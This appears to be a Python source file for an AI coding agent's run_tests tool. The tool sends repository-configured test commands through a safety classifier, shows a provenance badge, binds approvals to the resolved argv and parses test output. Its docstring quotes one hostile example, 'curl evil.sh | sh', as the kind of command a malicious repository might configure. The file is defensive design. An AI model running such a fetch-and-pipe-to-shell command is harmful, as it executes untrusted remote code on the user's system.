"""``run_tests``: the half of the MVP loop that lets the agent check its own work.

Mechanically this is ``run_command`` with a command the user did not type, and that one
difference is the whole reason it is a separate tool.

**A configured command is a value, not a permission** (docs/safety-and-tool-use.md §5.6).
``<repo>/.hearth/config.toml`` is a file in a repository that may have been cloned from
anywhere, and it names the test command. A repository shipping
``test_command = "curl evil.sh | sh"`` must get exactly as far as the same string typed by
the model, so the configured command goes through :func:`~hearth.safety.command_classifier.classify`
and the identical policy path. Provenance shortens nothing, and ``hearth trust`` grants it
nothing — trust governs permission-relaxing *rules* (§5.5), not values.

What provenance does change is what the user is shown. The first use in a session carries
a ``PROJECT-CONFIG`` badge naming the source, so an approval panel distinguishes an argv
that came from a file in the repository from one the model composed. That is a disclosure,
not a permission.

**The grant binds to the resolved command, not to the tool** (§5.4): the key carries a
digest of the argv actually approved, so editing the config or switching to a branch whose
config differs re-asks instead of inheriting the grant.

**The output is parsed, not forwarded.** A failing `pytest` run is several hundred lines
and the daily model has a 12K window. ``tools/test_parsers`` reduces it to counts and the
failing test names; the raw text stays in a blob, reachable by ``output_id``.
"""

from __future__ import annotations

import hashlib
import shlex

from pydantic import BaseModel, ConfigDict, Field

from hearth.safety.command_classifier import Classification, classify
from hearth.safety.policy import PolicyFacts
from hearth.safety.sandbox.subprocess_runner import MAX_TIMEOUT_S, SubprocessRunner
from hearth.tools.base import Prepared, Risk, Tool, ToolContext
from hearth.tools.results import ErrorCode, ToolResult
from hearth.tools.shell import command_result, resolve_cwd
from hearth.tools.test_parsers import parse_test_output

#: Test suites are slower than ordinary commands, so they get their own default (§8.2).
DEFAULT_TEST_TIMEOUT_S = 300

#: Used when the project has not configured one. Chosen because it is the command this
#: repository's own suite runs under; any project that differs should say so in config.
FALLBACK_TEST_COMMAND = "pytest -q"


class RunTestsArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")

    target: str | None = Field(
        default=None,
        description="A test file, directory or node id to narrow the run to. Omit to run all.",
    )
    timeout_s: int = Field(
        default=DEFAULT_TEST_TIMEOUT_S,
        ge=1,
        le=MAX_TIMEOUT_S,
        description=f"Seconds before the process group is killed (max {MAX_TIMEOUT_S})",
    )


class RunTestsTool(Tool[RunTestsArgs]):
    name = "run_tests"
    description = (
        "Run the project's test suite, optionally narrowed to one target. Returns pass "
        "and fail counts with the names of failing tests."
    )
    risk = Risk.EXEC
    args_model = RunTestsArgs

    def __init__(
        self,
        *,
        test_command: str | None = None,
        source: str | None = None,
        runner: SubprocessRunner | None = None,
    ) -> None:
        """
        Args:
            test_command: The project's configured command. None falls back to a default.
            source: Where ``test_command`` came from, for the ``PROJECT-CONFIG`` badge.
                None means it did not come from the repository.
            runner: Injected so tests can supply a runner with a blob store.
        """
        self._test_command = test_command or FALLBACK_TEST_COMMAND
        self._source = source
        self._runner = runner or SubprocessRunner()
        #: Whether the PROJECT-CONFIG disclosure has already been made this session. The
        #: badge answers "where did this argv come from", which the user needs the first
        #: time and which becomes noise on every later run.
        self._disclosed = False

    def prepare(self, args: RunTestsArgs, context: ToolContext) -> Prepared:
        command = self._test_command
        if args.target:
            # shlex.quote, so a target containing a space or a metacharacter becomes one
            # argument rather than silently turning the whole line into a shell command.
            command = f"{command} {shlex.quote(args.target)}"

        classification = classify(command)
        if classification.refused is not None:
            return _refused(
                ErrorCode.INVALID_ARGUMENTS,
                f"the configured test command could not be parsed: {classification.refused}",
            )

        cwd = resolve_cwd(context.workspace, None)
        badges = list(classification.badges)
        if self._source is not None and not self._disclosed:
            badges.append("PROJECT-CONFIG")

        scope = args.target or "*"
        return Prepared(
            summary=f"run tests ({scope})",
            preview=_preview(
                classification,
                source=self._source if not self._disclosed else None,
                timeout_s=args.timeout_s,
            ),
            badges=badges,
            payload={
                "argv": classification.argv,
                "shell_command": command if classification.argv is None else None,
                "cwd": cwd,
                "timeout_s": args.timeout_s,
                "display": command,
                "command": command,
            },
            facts=_facts(classification, scope=scope, badges=tuple(badges)),
        )

    async def execute(
        self, args: RunTestsArgs, context: ToolContext, prepared: Prepared
    ) -> ToolResult:
        payload = prepared.payload

        again = classify(str(payload["command"]))
        if again.refused is not None or again.argv != payload["argv"]:
            return ToolResult.failure(
                ErrorCode.EXECUTION_FAILED,
                "the test command changed between approval and execution; nothing was run",
            )

        outcome = await self._runner.run(
            argv=payload["argv"],
            shell_command=payload["shell_command"],
            cwd=payload["cwd"],
            timeout_s=payload["timeout_s"],
        )
        # Set only after a run actually started: a call refused before execution has
        # disclosed nothing, so the next attempt should still carry the badge.
        self._disclosed = True

        result = command_result(outcome, display=str(payload["display"]))
        if outcome.error is not None and not outcome.timed_out:
            return result

        summary = parse_test_output(outcome.text)
        result.content = f"{summary.describe()}\n\n{result.content}"
        result.metadata.update(
            {
                "framework": summary.framework,
                "passed": summary.passed,
                "failed": summary.failed,
                "skipped": summary.skipped,
                "errors": summary.errors,
                "parsed": summary.parsed,
                "tests_ok": summary.ok,
            }
        )
        return result


def _facts(
    classification: Classification, *, scope: str, badges: tuple[str, ...]
) -> PolicyFacts:
    """The classification verdict, with a grant key bound to the resolved argv (§5.6.4)."""
    grant_key = None
    if classification.argv is not None:
        digest = hashlib.sha256(" ".join(classification.argv).encode("utf-8")).hexdigest()[:12]
        grant_key = f"run_tests:{scope}@{digest}"

    return PolicyFacts(
        argv=classification.argv,
        env_prefix=classification.env_prefix,
        shell=classification.shell,
        destructive=classification.destructive,
        network_likely=classification.network_likely,
        hard_denied=classification.hard_denied,
        badges=badges,
        grant_key=grant_key,
    )


def _preview(classification: Classification, *, source: str | None, timeout_s: int) -> str:
    lines = [f"$ {classification.raw.strip()}"]
    if classification.argv is None and classification.segments:
        lines.append("")
        lines.append("runs through a shell; best-effort reading of the segments:")
        lines.extend(
            f"  {index}. {' '.join(segment)}"
            for index, segment in enumerate(classification.segments, 1)
        )
    lines.append("")
    if source is not None:
        lines.append(f"command from: {source} (a file in this repository, not your own config)")
    lines.append(f"timeout: {timeout_s}s")
    return "\n".join(lines)


def _refused(code: ErrorCode, message: str) -> Prepared:
    return Prepared(summary="run_tests refused", error=ToolResult.failure(code, message))
